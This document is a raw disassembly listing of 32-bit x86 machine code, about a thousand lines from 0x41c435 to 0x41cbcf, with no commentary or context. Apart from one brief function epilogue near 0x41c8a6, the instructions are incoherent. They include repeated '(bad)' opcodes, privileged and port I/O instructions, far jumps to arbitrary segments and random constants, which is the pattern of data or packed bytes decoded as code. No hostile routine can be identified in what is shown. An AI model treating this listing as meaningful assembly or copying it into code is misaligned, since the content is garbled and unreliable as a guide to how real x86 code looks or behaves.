  41c435:	jmp    0x41c470
  41c437:	test   BYTE PTR [esi+0x19],0x21
  41c43b:	or     esp,edx
  41c43d:	pushf  
  41c43e:	adc    BYTE PTR [eax-0x6],0x4b
  41c442:	dec    esp
  41c443:	(bad)  
  41c444:	pop    edx
  41c445:	sbb    al,0x75
  41c447:	leave  
  41c448:	mov    ?,WORD PTR [edi+0x52812583]
  41c44e:	dec    ebx
  41c44f:	mov    edi,0x8540886f
  41c454:	push   ebp
  41c455:	or     BYTE PTR [eax-0x2e],dl
  41c458:	fsubr  QWORD PTR [eax+0x9]
  41c45b:	(bad)  
  41c45c:	jmp    0x41c46c
  41c45e:	cmp    al,0x7a
  41c460:	pop    edi
  41c461:	jnp    0x41c4d6
  41c463:	icebp  
  41c464:	cmp    BYTE PTR [ebx-0x1e85a7fe],0xad
  41c46b:	sub    edi,DWORD PTR [edi+0x7c]
  41c46e:	fldenv ds:0x7b7dceb8
  41c474:	adc    BYTE PTR [ebp+0x17b56941],cl
  41c47a:	adc    BYTE PTR [edi],al
  41c47c:	shl    DWORD PTR [ebx+0x112326ce],0x24
  41c483:	in     eax,0x2c
  41c485:	arpl   WORD PTR [eax],di
  41c487:	outs   dx,DWORD PTR ds:[esi]
  41c488:	mov    ecx,0x6f658121
  41c48d:	es stos DWORD PTR es:[edi],eax
  41c48f:	jne    0x41c4ac
  41c491:	mov    al,ds:0x273a7f6c
  41c496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c498:	stos   BYTE PTR es:[edi],al
  41c499:	ror    cl,1
  41c49b:	jo     0x41c44c
  41c49d:	test   ebp,edx
  41c49f:	loop   0x41c4af
  41c4a1:	and    eax,0xeac76226
  41c4a6:	out    dx,al
  41c4a7:	test   BYTE PTR fs:[esi-0x4a0fbd35],0x30
  41c4af:	mov    dl,0xe2
  41c4b1:	fwait
  41c4b2:	mov    esp,0x6448f001
  41c4b7:	bound  ecx,QWORD PTR [edi-0x3f]
  41c4ba:	dec    ebp
  41c4bb:	xor    BYTE PTR [ecx+0xd2847c9],dh
  41c4c1:	loop   0x41c46a
  41c4c3:	stc    
  41c4c4:	cmp    eax,0xf5abe902
  41c4c9:	(bad)  
  41c4ca:	int    0xb
  41c4cc:	(bad)  
  41c4cd:	int3   
  41c4ce:	into   
  41c4cf:	ss mov bh,0x18
  41c4d2:	pop    es
  41c4d3:	inc    ebx
  41c4d4:	in     al,dx
  41c4d5:	int3   
  41c4d6:	inc    esp
  41c4d7:	jle    0x41c4d1
  41c4d9:	stc    
  41c4da:	mov    al,0x66
  41c4dc:	dec    ebp
  41c4dd:	(bad)  
  41c4de:	push   ebx
  41c4df:	inc    esi
  41c4e0:	adc    esi,esi
  41c4e2:	mov    WORD PTR [edx],ss
  41c4e4:	and    BYTE PTR ds:0xb523a816,0x5f
  41c4eb:	in     al,dx
  41c4ec:	(bad)  
  41c4ee:	xchg   BYTE PTR [eax],dh
  41c4f0:	inc    ebp
  41c4f1:	adc    edi,DWORD PTR [esi+0x4016630f]
  41c4f7:	not    ebx
  41c4f9:	es xchg esp,eax
  41c4fb:	dec    eax
  41c4fc:	sub    al,0x15
  41c4fe:	sbb    bl,cl
  41c500:	retf   
  41c501:	ror    BYTE PTR [ebx],0x70
  41c504:	int3   
  41c505:	sub    eax,0x12ad4c65
  41c50a:	aam    0x51
  41c50c:	nop
  41c50d:	cmp    DWORD PTR ds:0xebc9b042,0x2c
  41c514:	in     eax,0xf
  41c516:	ret    
  41c517:	mov    bl,0x3e
  41c519:	int3   
  41c51a:	sub    ebx,esi
  41c51c:	dec    esp
  41c51d:	pop    esp
  41c51e:	inc    ebx
  41c51f:	int    0xe7
  41c521:	cli    
  41c522:	mov    DWORD PTR [ebp-0x9b553c8],ebx
  41c528:	mov    bh,0x2
  41c52a:	popf   
  41c52b:	popf   
  41c52c:	std    
  41c52d:	mov    edx,0x7dc199a7
  41c532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c533:	and    eax,eax
  41c535:	iret   
  41c536:	xchg   ecx,eax
  41c537:	cmp    ecx,DWORD PTR [ebx]
  41c539:	retf   
  41c53a:	sub    BYTE PTR [ecx*1+0x1b964ebb],0x7d
  41c542:	fnsave [ebx]
  41c544:	data16 repz hlt 
  41c547:	push   ds
  41c548:	xor    DWORD PTR [eax],ecx
  41c54a:	div    BYTE PTR [ecx-0x6f]
  41c54d:	loop   0x41c4df
  41c54f:	sahf   
  41c550:	sub    ch,BYTE PTR [ebp+0x76b5b713]
  41c556:	iret   
  41c557:	and    eax,0xa40de5ea
  41c55c:	push   ebx
  41c55d:	ss leave 
  41c55f:	int3   
  41c560:	rol    BYTE PTR [esi],0x22
  41c563:	cmp    al,0x92
  41c565:	adc    al,BYTE PTR [esi+0x17]
  41c568:	or     DWORD PTR [edi+0x6],0x7d
  41c56c:	cmp    BYTE PTR [ecx+esi*8-0x5e78338e],cl
  41c573:	dec    edx
  41c574:	pushf  
  41c575:	sub    DWORD PTR ds:0x254b525f,esi
  41c57b:	jmp    0x41c51f
  41c57d:	push   esi
  41c57e:	out    0x26,eax
  41c580:	xchg   ebx,eax
  41c581:	push   ecx
  41c582:	rol    BYTE PTR [edi],0x91
  41c585:	sub    DWORD PTR [ebp-0x32e03f06],ebp
  41c58b:	xchg   edi,eax
  41c58c:	push   es
  41c58d:	jns    0x41c525
  41c58f:	bound  esp,QWORD PTR [edi]
  41c591:	xchg   dx,ax
  41c593:	jmp    0x8411:0xc43aa248
  41c59a:	pop    ebx
  41c59b:	mov    fs,WORD PTR [eax]
  41c59d:	and    bl,BYTE PTR [edx+0x49]
  41c5a0:	and    al,BYTE PTR [esi]
  41c5a2:	sbb    dh,dh
  41c5a4:	push   ebp
  41c5a5:	ret    
  41c5a6:	icebp  
  41c5a7:	fbld   TBYTE PTR [esi]
  41c5a9:	mov    WORD PTR [esi-0xb],ss
  41c5ac:	sub    ch,BYTE PTR [esi]
  41c5ae:	xor    DWORD PTR [edx],edi
  41c5b0:	xor    BYTE PTR [edi+0xe],dl
  41c5b3:	and    eax,0x41503e0f
  41c5b8:	ins    BYTE PTR es:[edi],dx
  41c5b9:	popa   
  41c5ba:	sti    
  41c5bb:	aaa    
  41c5bc:	add    BYTE PTR [esi+ebp*2-0x39],dl
  41c5c0:	jg     0x41c57a
  41c5c2:	fs dec edi
  41c5c4:	enter  0x26cd,0xa1
  41c5c8:	mov    bh,0x6b
  41c5ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5cb:	sbb    al,0xc9
  41c5cd:	xchg   esp,eax
  41c5ce:	adc    eax,0xbeaec235
  41c5d3:	scas   eax,DWORD PTR es:[edi]
  41c5d4:	push   ds
  41c5d5:	inc    esp
  41c5d6:	jl     0x41c55f
  41c5d8:	jle    0x41c5cb
  41c5da:	dec    edx
  41c5db:	jns    0x41c57a
  41c5dd:	jmp    0x9ff99d2e
  41c5e2:	repnz dec ch
  41c5e5:	lock mov edi,0xdb6011f5
  41c5eb:	mov    dl,0x98
  41c5ed:	xor    al,0x11
  41c5ef:	pop    esi
  41c5f0:	xor    DWORD PTR [ebx],ebx
  41c5f2:	fld    QWORD PTR [ecx+0x2aa7d757]
  41c5f8:	clc    
  41c5f9:	sub    BYTE PTR [eax],ah
  41c5fb:	enter  0x323c,0xaa
  41c5ff:	leave  
  41c600:	aaa    
  41c601:	dec    eax
  41c602:	mov    ah,0x40
  41c604:	push   cs
  41c605:	inc    eax
  41c606:	sub    al,0xd1
  41c608:	add    eax,DWORD PTR [esi+edx*1+0x6c]
  41c60c:	or     eax,0x2ae4d79a
  41c611:	mov    al,ds:0xf95fda96
  41c616:	call   0xb6a605d0
  41c61b:	push   edi
  41c61c:	stc    
  41c61d:	dec    ebp
  41c61e:	aaa    
  41c61f:	sbb    eax,0x22936700
  41c624:	iret   
  41c625:	jnp    0x41c648
  41c627:	imul   ebp,DWORD PTR [eax],0xffffff9d
  41c62a:	shl    DWORD PTR [ebx-0x5f],0x7
  41c62e:	aaa    
  41c62f:	pop    es
  41c630:	sub    bh,bl
  41c632:	outs   dx,DWORD PTR ds:[esi]
  41c633:	mov    cl,0x86
  41c635:	xchg   DWORD PTR [edx-0x682795d0],ecx
  41c63b:	fucomp st(2)
  41c63d:	add    al,0xd8
  41c63f:	xchg   edx,eax
  41c640:	inc    esp
  41c641:	dec    ebx
  41c642:	sub    sp,WORD PTR [ebx]
  41c645:	es js  0x41c6be
  41c648:	cmp    DWORD PTR [ecx+0x65],ecx
  41c64b:	test   BYTE PTR [esi],bh
  41c64d:	dec    esp
  41c64e:	sbb    eax,0x2009703f
  41c653:	jecxz  0x41c6cc
  41c655:	and    eax,DWORD PTR [ebx-0x1724ea25]
  41c65b:	test   BYTE PTR [esi+esi*8],ch
  41c65e:	dec    eax
  41c65f:	(bad)  
  41c660:	push   cs
  41c661:	dec    edi
  41c662:	inc    edi
  41c663:	jecxz  0x41c623
  41c665:	inc    esi
  41c666:	sub    ah,BYTE PTR [edi+0x2c43e3a0]
  41c66c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c66d:	mov    ebp,0x2210e1cd
  41c672:	sti    
  41c673:	pop    ss
  41c674:	mov    esi,0x9d75a7fc
  41c679:	mov    al,ds:0x92d6197a
  41c67e:	mov    eax,0x4dcfbf58
  41c683:	fld    DWORD PTR [ebx+0x6ec87cf2]
  41c689:	xchg   esi,eax
  41c68a:	cwde   
  41c68b:	je     0x41c6f1
  41c68d:	jb     0x41c6e0
  41c68f:	lea    ebx,[eax+eax*8]
  41c692:	mov    ah,BYTE PTR ds:0x27e9bdbd
  41c698:	push   0x9c0fa33d
  41c69d:	pop    eax
  41c69e:	or     ecx,DWORD PTR [ebx+ecx*8]
  41c6a1:	dec    esi
  41c6a2:	fwait
  41c6a3:	pop    ss
  41c6a4:	lock add BYTE PTR [ecx+0x2aca58cc],dh
  41c6ab:	mov    esp,0x888c6047
  41c6b0:	cmp    al,BYTE PTR [eax-0x2ab448ce]
  41c6b6:	ficom  WORD PTR [eax+0x4d]
  41c6b9:	jmp    0x41c720
  41c6bb:	sbb    ecx,DWORD PTR [ebp+0x51]
  41c6be:	addr16 jmp 0xf619:0xb88142e5
  41c6c6:	dec    ebx
  41c6c7:	mov    ebx,0xa1c408c5
  41c6cc:	repnz call 0xa077:0x48dd64f2
  41c6d4:	mov    bh,0x87
  41c6d6:	call   0x418a28b1
  41c6db:	jmp    0x35e6:0xcd94179d
  41c6e2:	cmp    ebp,esi
  41c6e4:	jp     0x41c6a8
  41c6e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6e7:	mov    eax,0xcb765cf8
  41c6ec:	lds    ebp,FWORD PTR [edi-0x16af41e]
  41c6f2:	cmp    ebx,esi
  41c6f4:	jecxz  0x41c714
  41c6f6:	shl    BYTE PTR [edi-0xb77f4e0],0xa3
  41c6fd:	inc    eax
  41c6fe:	cld    
  41c6ff:	pop    edi
  41c700:	call   0x4121:0x43b7c5d9
  41c707:	mov    dl,0x52
  41c709:	lea    esp,[esi-0x5]
  41c70c:	stos   BYTE PTR es:[edi],al
  41c70d:	mov    ds:0xc5168869,eax
  41c712:	icebp  
  41c713:	dec    edx
  41c714:	fs adc al,0xd0
  41c717:	test   eax,0x361ca2ca
  41c71c:	out    0x9a,al
  41c71e:	xor    al,0x1c
  41c720:	adc    al,0xae
  41c722:	and    DWORD PTR [esi+0x34],ebx
  41c725:	add    ah,bl
  41c727:	cwde   
  41c728:	or     ch,0x6f
  41c72b:	fisttp QWORD PTR ds:0x2da18b21
  41c731:	nop
  41c732:	js     0x41c77b
  41c734:	cmp    eax,0xfc9b6f35
  41c739:	loopne 0x41c741
  41c73b:	fadd   DWORD PTR [ebx]
  41c73d:	(bad)  
  41c73e:	jne    0x41c71f
  41c740:	cwd    
  41c742:	imul   esi,DWORD PTR [edx],0x98356218
  41c748:	rcl    ch,1
  41c74a:	wrmsr  
  41c74c:	jp     0x41c7ae
  41c74e:	push   ecx
  41c74f:	xor    ecx,DWORD PTR [ebp-0x61]
  41c752:	pop    ss
  41c753:	mov    eax,0x10fc6e81
  41c758:	jb     0x41c783
  41c75a:	inc    eax
  41c75b:	push   ecx
  41c75c:	push   0xceb86bfd
  41c761:	popa   
  41c762:	popf   
  41c763:	jg     0x41c78c
  41c765:	xchg   edx,eax
  41c766:	jo     0x41c783
  41c768:	jmp    0x9a9f5f76
  41c76d:	pop    edi
  41c76e:	idiv   al
  41c770:	imul   BYTE PTR [edi+0x92cfa2c]
  41c776:	sti    
  41c777:	jo     0x41c7a4
  41c779:	mov    ah,0x5e
  41c77b:	dec    esp
  41c77c:	loop   0x41c717
  41c77e:	aam    0x34
  41c780:	mov    ch,0x32
  41c782:	daa    
  41c783:	pop    ss
  41c784:	cmp    eax,0x92c915a3
  41c789:	mov    ds:0xc90db94e,al
  41c78e:	sti    
  41c78f:	call   0xf38:0x18bfda20
  41c796:	cmp    eax,0xdf6631d
  41c79b:	xor    al,0xd1
  41c79d:	inc    edx
  41c79e:	jo     0x41c81e
  41c7a0:	inc    eax
  41c7a1:	and    eax,0x17203d65
  41c7a6:	adc    BYTE PTR [eax],dl
  41c7a8:	add    ecx,DWORD PTR [eax+edi*2]
  41c7ab:	adc    eax,0xffe9482a
  41c7b0:	hlt    
  41c7b1:	mov    ebp,esi
  41c7b3:	or     eax,0xad33c879
  41c7b8:	lods   al,BYTE PTR ds:[esi]
  41c7b9:	cmp    dl,BYTE PTR [edx+0x36de0687]
  41c7bf:	pop    esi
  41c7c0:	mov    edx,0x3863a934
  41c7c5:	pop    edx
  41c7c6:	xor    esp,ebp
  41c7c8:	daa    
  41c7c9:	cmp    al,0x6e
  41c7cb:	or     DWORD PTR [ebx+ebx*2],edi
  41c7ce:	mov    BYTE PTR [esi],bh
  41c7d0:	or     DWORD PTR [esi+ecx*4+0x3ecf3c6b],edx
  41c7d7:	inc    edx
  41c7d8:	aam    0x95
  41c7da:	(bad)
  41c7de:	inc    eax
  41c7df:	sbb    eax,0x4d47cc34
  41c7e4:	gs scas al,BYTE PTR es:[edi]
  41c7e6:	mov    edx,0xeff9e1ef
  41c7eb:	pop    esp
  41c7ec:	jnp    0x41c82e
  41c7ee:	jmp    0x41c7b7
  41c7f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7f1:	test   BYTE PTR [ecx+0x37],ah
  41c7f4:	xchg   ebp,eax
  41c7f5:	shr    ecx,cl
  41c7f7:	ja     0x41c7ba
  41c7f9:	outs   dx,DWORD PTR ds:[esi]
  41c7fa:	mov    ebp,DWORD PTR [eax]
  41c7fc:	xor    al,BYTE PTR [esi+0x2fc6b1b]
  41c802:	push   es
  41c803:	ret    
  41c804:	stc    
  41c805:	std    
  41c806:	or     ebx,DWORD PTR [ebp+0x3e1df727]
  41c80c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c80d:	into   
  41c80e:	pop    esi
  41c80f:	fst    st(7)
  41c811:	cdq    
  41c812:	pushf  
  41c813:	mov    esi,0x997e2ee2
  41c818:	pusha  
  41c819:	adc    BYTE PTR [edx+0x94706df],ah
  41c81f:	pop    ds
  41c820:	or     BYTE PTR [ebx+0x5d],0x70
  41c824:	mov    WORD PTR [ecx],es
  41c826:	test   eax,0x447956be
  41c82b:	mov    esi,DWORD PTR ds:0xb50bb16b
  41c831:	iret   
  41c832:	mov    bl,0x74
  41c834:	add    DWORD PTR [edi-0x71],edx
  41c837:	xor    BYTE PTR [eax+0x18],ah
  41c83a:	nop
  41c83b:	jbe    0x41c8a8
  41c83d:	fs pushf 
  41c83f:	popa   
  41c840:	mov    ebx,0xfdb82e43
  41c845:	ror    BYTE PTR [esi-0x54],0x7d
  41c849:	ins    DWORD PTR es:[edi],dx
  41c84a:	imul   ecx,DWORD PTR [esi+0x17],0x749e4961
  41c851:	dec    edx
  41c852:	shl    DWORD PTR ss:[esi+0x24],0x8
  41c857:	jo     0x41c8d5
  41c859:	push   esp
  41c85a:	jecxz  0x41c85d
  41c85c:	sub    esi,0x3e
  41c85f:	mov    esi,0xbc37e775
  41c864:	jge    0x41c89c
  41c866:	jbe    0x41c831
  41c868:	test   eax,0x3c74b9ef
  41c86d:	adc    ch,BYTE PTR [ecx]
  41c86f:	xchg   BYTE PTR [eax+0x70],ch
  41c872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c873:	enter  0x979a,0x8
  41c877:	mov    ?,WORD PTR [edx+0x5208c5dc]
  41c87d:	pop    ds
  41c87e:	dec    ebp
  41c87f:	or     DWORD PTR [esi],eax
  41c881:	sti    
  41c882:	adc    al,BYTE PTR [ebx]
  41c884:	jl     0x41c89a
  41c886:	loop   0x41c826
  41c888:	loope  0x41c8de
  41c88a:	xor    al,cl
  41c88c:	cmp    dh,bh
  41c88e:	cmp    al,0x46
  41c890:	ret    
  41c891:	xchg   BYTE PTR [ebp-0x3d03e2d9],ch
  41c897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c898:	mov    eax,0xe0222eca
  41c89d:	and    BYTE PTR [ebx],al
  41c89f:	ror    DWORD PTR [ebx-0x50f0f3b3],0xc1
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0x83c588e2
  41c8c2:	inc    ebx
  41c8c3:	pusha  
  41c8c4:	scas   eax,DWORD PTR es:[edi]
  41c8c5:	test   DWORD PTR [ecx],eax
  41c8c7:	add    BYTE PTR [ebx+0x27000000],ch
  41c8cd:	mov    eax,?
  41c8cf:	mov    dl,0xe6
  41c8d1:	or     ebp,ecx
  41c8d3:	lea    ebp,[ebx-0x1a38cba6]
  41c8d9:	mov    ds:0x749b3290,eax
  41c8de:	sar    BYTE PTR [edi],0x80
  41c8e1:	enter  0x9758,0xe8
  41c8e5:	outs   dx,BYTE PTR ds:[esi]
  41c8e6:	call   0x2b23:0x3ce19870
  41c8ed:	outs   dx,DWORD PTR ds:[esi]
  41c8ee:	sahf   
  41c8ef:	mul    ebx
  41c8f1:	das    
  41c8f2:	mov    bl,0xbd
  41c8f4:	hlt    
  41c8f5:	stos   BYTE PTR es:[edi],al
  41c8f6:	push   0xffffffbc
  41c8f8:	in     al,0x26
  41c8fa:	xlat   BYTE PTR ds:[ebx]
  41c8fb:	cmp    ch,ah
  41c8fd:	mov    esp,DWORD PTR [edx-0x55]
  41c900:	jecxz  0x41c918
  41c902:	cld    
  41c903:	push   0xffffffc9
  41c905:	outs   dx,BYTE PTR ds:[esi]
  41c906:	pop    edx
  41c907:	lock imul edx,DWORD PTR [edx*2-0x23373c4c],0xb321993e
  41c913:	fisubr WORD PTR [edx]
  41c915:	and    eax,0x5466fe25
  41c91a:	dec    edx
  41c91b:	pop    esp
  41c91c:	push   esp
  41c91d:	pusha  
  41c91e:	sub    BYTE PTR [edx],bl
  41c920:	shl    DWORD PTR [ebx+0x482b6580],cl
  41c926:	cld    
  41c927:	and    DWORD PTR [edx],eax
  41c929:	fild   DWORD PTR ds:0xee8f3c2a
  41c92f:	(bad)  
  41c931:	cmp    DWORD PTR [esi+0x14f289a9],edi
  41c937:	xchg   ebp,eax
  41c938:	add    BYTE PTR [eax],0xda
  41c93b:	pop    ebp
  41c93c:	(bad)  
  41c93d:	cmp    ebp,DWORD PTR [ebp+0x220435f7]
  41c943:	dec    ebp
  41c944:	out    dx,al
  41c945:	mov    BYTE PTR [edx+0x56],dh
  41c948:	xchg   esp,eax
  41c949:	nop
  41c94a:	push   ss
  41c94b:	and    DWORD PTR ds:0x811ae446,ecx
  41c951:	and    ebx,DWORD PTR es:[ebx-0x19b772c5]
  41c958:	repz dec eax
  41c95a:	xchg   esp,eax
  41c95b:	(bad)  
  41c95c:	ror    BYTE PTR [edx-0x42],1
  41c95f:	cmp    BYTE PTR [edi],al
  41c961:	sbb    BYTE PTR [edi+0x612b47b2],cl
  41c967:	mov    ah,BYTE PTR [esp+edi*1+0x7b]
  41c96b:	add    eax,0xf02a5f8c
  41c970:	mov    dh,0x2e
  41c972:	fsub   DWORD PTR [eax+0x10]
  41c975:	retf   
  41c976:	mov    dl,0x0
	...
  41c984:	shr    DWORD PTR [esp+edx*1],1
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0x7c545c30
  41c994:	pop    edx
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [ebx+0x61000000],ch
  41c99d:	cld    
  41c99e:	sar    BYTE PTR [ecx+0x3c36c260],0x4f
  41c9a5:	dec    eax
  41c9a6:	popa   
  41c9a7:	outs   dx,BYTE PTR ds:[esi]
  41c9a8:	jbe    0x41c999
  41c9aa:	xchg   ebx,eax
  41c9ab:	cmp    DWORD PTR [ecx+0x3b303e12],ebx
  41c9b1:	pop    esi
  41c9b2:	not    BYTE PTR [esi-0x3a65fbd1]
  41c9b8:	and    DWORD PTR [eax],edx
  41c9ba:	jb     0x41c9be
  41c9bc:	lds    edx,FWORD PTR [ebx+0x116d55b9]
  41c9c2:	es hlt 
  41c9c4:	sub    al,0x7d
  41c9c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9c7:	iret   
  41c9c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9c9:	bound  edx,QWORD PTR [edi]
  41c9cb:	push   edx
  41c9cc:	call   0x6041da29
  41c9d1:	es jmp 0x8ce3:0xb2edd16a
  41c9d9:	add    bh,ch
  41c9db:	xor    BYTE PTR ds:0x421e7f99,cl
  41c9e1:	shr    BYTE PTR [ecx-0x475e5670],cl
  41c9e7:	fbstp  TBYTE PTR [edi+0x145de43]
  41c9ed:	pop    ds
  41c9ee:	out    0xb9,eax
  41c9f0:	mov    edx,0x5a51ed8b
  41c9f5:	jns    0x41c9e2
  41c9f7:	dec    eax
  41c9f8:	arpl   WORD PTR [ebx+0x1c56ed64],dx
  41c9fe:	sbb    cl,BYTE PTR [ebp-0x18fa2208]
  41ca04:	iret   
  41ca05:	call   0x8d36:0x5523d348
  41ca0c:	shl    esp,0xfc
  41ca0f:	mov    ebp,0x829b372d
  41ca14:	push   edx
  41ca15:	and    eax,ecx
  41ca17:	cmc    
  41ca18:	shl    DWORD PTR [ebx-0x4fd24ae1],1
  41ca1e:	dec    ebp
  41ca1f:	enter  0xa854,0x5f
  41ca23:	push   0x6e68bdbc
  41ca28:	jmp    0x8360e0a9
  41ca2d:	mov    dl,0x8e
  41ca2f:	xor    BYTE PTR [eax],ah
  41ca31:	xchg   esp,eax
  41ca32:	test   BYTE PTR [esi+ebx*1],ah
  41ca35:	cdq    
  41ca36:	outs   dx,DWORD PTR ds:[esi]
  41ca37:	(bad)  
  41ca38:	in     eax,dx
  41ca39:	adc    ecx,DWORD PTR [ebp-0x3f550c28]
  41ca3f:	lea    eax,[ebx-0xf7b013f]
  41ca45:	bound  esi,QWORD PTR [esi+0x0]
	...
  41ca54:	pop    ds
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2-0x7734d248],0x5
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [ebx-0x43000000],ch
  41ca6d:	inc    ebx
  41ca6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca6f:	inc    esp
  41ca70:	xchg   ebp,eax
  41ca71:	mov    ds:0x490ad38e,eax
  41ca76:	push   eax
  41ca77:	xchg   edx,eax
  41ca78:	xchg   edx,eax
  41ca79:	xor    eax,0xe4bdf044
  41ca7e:	adc    cl,0x96
  41ca81:	mov    al,ds:0x96878eaf
  41ca86:	or     DWORD PTR [edi],esp
  41ca88:	aas    
  41ca89:	jmp    0x41cab1
  41ca8b:	int3   
  41ca8c:	data16 fimul DWORD PTR [ecx+0x5dac821e]
  41ca93:	adc    esp,ebx
  41ca95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca96:	adc    ebx,DWORD PTR [esi+ecx*1]
  41ca99:	cld    
  41ca9a:	pop    ecx
  41ca9b:	daa    
  41ca9c:	(bad)  
  41ca9d:	mov    bh,ah
  41ca9f:	or     ch,BYTE PTR [esi-0x107e71f0]
  41caa5:	push   edi
  41caa6:	retf   0xd6c3
  41caa9:	pop    esp
  41caaa:	dec    eax
  41caab:	leave  
  41caac:	sub    eax,0x63e16638
  41cab1:	xchg   DWORD PTR [ebp+0x31],edi
  41cab4:	mov    ds:0xdadd90d9,al
  41cab9:	and    ebx,DWORD PTR [eax-0xc]
  41cabc:	rol    bh,0x78
  41cabf:	popf   
  41cac0:	mov    esp,DWORD PTR [ebx+0x64]
  41cac3:	pop    ecx
  41cac4:	sbb    ecx,ebx
  41cac6:	and    BYTE PTR [esi],0x36
  41cac9:	fisubr DWORD PTR [edx]
  41cacb:	mov    bh,BYTE PTR [edx-0x5e]
  41cace:	xchg   edx,eax
  41cacf:	in     eax,dx
  41cad0:	mov    es,esp
  41cad2:	repnz fcmovnu st,st(1)
  41cad5:	popf   
  41cad6:	dec    ecx
  41cad7:	mov    ecx,0x50fb1806
  41cadc:	repnz rol DWORD PTR [edx+esi*1+0x695e6d46],0xfe
  41cae5:	mov    edx,0xec96b395
  41caea:	out    dx,eax
  41caeb:	(bad)  
  41caec:	je     0x41ca97
  41caee:	or     al,0xee
  41caf0:	ja     0x41cadc
  41caf2:	lods   eax,DWORD PTR ds:[esi]
  41caf3:	or     al,0xe1
  41caf5:	adc    al,0x97
  41caf7:	imul   DWORD PTR [edx+0x7c0b7024]
  41cafd:	hlt    
  41cafe:	and    DWORD PTR [ecx],ecx
  41cb00:	or     ah,BYTE PTR [ebx]
  41cb02:	inc    esi
  41cb03:	ds iret 
  41cb05:	aas    
  41cb06:	cli    
  41cb07:	clc    
  41cb08:	xor    ah,BYTE PTR [ebx+0x49e6c502]
  41cb0e:	hlt    
  41cb0f:	adc    al,0xba
  41cb11:	scas   al,BYTE PTR es:[edi]
  41cb12:	scas   al,BYTE PTR es:[edi]
  41cb13:	in     al,0x7
  41cb15:	sbb    DWORD PTR [eax],edi
	...
  41cb23:	add    BYTE PTR [edi],ch
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	aam    0x87
  41cb32:	fiadd  WORD PTR [ebp+0x187b0]
  41cb38:	stos   DWORD PTR es:[edi],eax
  41cb39:	add    BYTE PTR [eax],al
  41cb3b:	add    BYTE PTR [eax+edx*1],bh
  41cb3e:	cmp    ah,BYTE PTR [ebx+0x2754bc45]
  41cb44:	shl    DWORD PTR [edi],1
  41cb46:	into   
  41cb47:	fs cmp dh,dl
  41cb4a:	dec    ebx
  41cb4b:	dec    ebx
  41cb4c:	lahf   
  41cb4d:	jnp    0x41cb49
  41cb4f:	mov    ds:0x2b18bee5,eax
  41cb54:	cmp    eax,0xaa60d09c
  41cb59:	lds    edi,FWORD PTR [ebx]
  41cb5b:	sub    eax,0xcb90a6bd
  41cb60:	dec    edx
  41cb61:	fwait
  41cb62:	mov    al,0x59
  41cb64:	inc    esi
  41cb65:	xchg   BYTE PTR [esi-0x6f],ah
  41cb68:	and    BYTE PTR [ebx-0x7caf2ccd],cl
  41cb6e:	je     0x41cbc5
  41cb70:	mov    edx,0x9a04542a
  41cb75:	xchg   bh,cl
  41cb77:	pushf  
  41cb78:	mov    al,0x31
  41cb7a:	cmp    eax,0x7d2dc712
  41cb7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb80:	lods   eax,DWORD PTR ds:[esi]
  41cb81:	neg    DWORD PTR [edx]
  41cb83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb84:	pop    edi
  41cb85:	popa   
  41cb86:	bound  esi,QWORD PTR [edx+0x37]
  41cb89:	hlt    
  41cb8a:	sahf   
  41cb8b:	shr    BYTE PTR [edi+0x30be97d7],cl
  41cb91:	ins    BYTE PTR es:[edi],dx
  41cb92:	xchg   edi,eax
  41cb93:	arpl   ax,si
  41cb95:	mov    DWORD PTR [eax+0x100f0db3],esp
  41cb9b:	cvtpi2ps xmm5,QWORD PTR [edi]
  41cb9e:	cli    
  41cb9f:	push   ebx
  41cba0:	jmp    0xec6d:0x322c31f6
  41cba7:	sbb    al,al
  41cba9:	sub    al,0x49
  41cbab:	cmp    edx,DWORD PTR [esi-0x50]
  41cbae:	dec    edi
  41cbaf:	dec    ecx
  41cbb0:	jge    0x41cbfd
  41cbb2:	js     0x41cc1d
  41cbb4:	nop
  41cbb5:	xlat   BYTE PTR ds:[ebx]
  41cbb6:	sbb    DWORD PTR [ecx],ecx
  41cbb8:	mov    ecx,0x1cb855e7
  41cbbd:	xor    edx,ebp
  41cbbf:	add    DWORD PTR [edx],esi
  41cbc1:	mov    ah,0x69
  41cbc3:	jnp    0x41cbef
  41cbc5:	repnz lahf 
  41cbc7:	add    DWORD PTR [edi],ebx
  41cbc9:	xchg   ebx,eax
  41cbca:	cmp    BYTE PTR [ecx+0x3],0x14
  41cbce:	ret    
  41cbcf:	push   cs
